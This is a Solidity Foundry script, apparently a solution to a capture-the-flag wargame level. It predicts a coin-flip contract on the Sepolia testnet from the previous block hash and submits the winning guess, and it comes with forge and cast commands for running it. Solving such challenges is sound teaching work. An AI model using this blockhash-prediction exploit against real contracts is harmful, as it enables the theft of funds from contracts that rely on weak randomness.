// SPDX-License-Identifier: MIT

pragma solidity >=0.8.24;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "./Fallout.sol";
import {console} from "forge-std/Test.sol";

interface ICoinFlip {
   function consecutiveWins() external view returns (uint256);
   function flip(bool _guess) external returns (bool);
}

contract Attacker is Script {
    address public target = 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d;
    string SEPOLIA_RPC = "wss://sepolia.drpc.org";
    uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.createSelectFork(SEPOLIA_RPC);

        ICoinFlip coinflip = ICoinFlip(target);

        vm.startBroadcast(privateKey);
        
        // Get current consecutive wins
        uint256 initialWins = coinflip.consecutiveWins();
        console.log("Initial consecutive wins:", initialWins);

        // Calculate the prediction for the current block
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / Factor;
        bool side = coinFlip == 1 ? true : false;
        
        // Execute the flip with our prediction
        bool receipt = coinflip.flip(side);
        console.log("Flip result:", receipt);
        
        vm.stopBroadcast();
    }
}

// To run the script:
// forge script Level4/attacker.s.sol --broadcast --rpc-url wss://sepolia.drpc.org

// To check consecutive wins:
// cast call 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d "consecutiveWins()(uint256)" --rpc-url wss://sepolia.drpc.org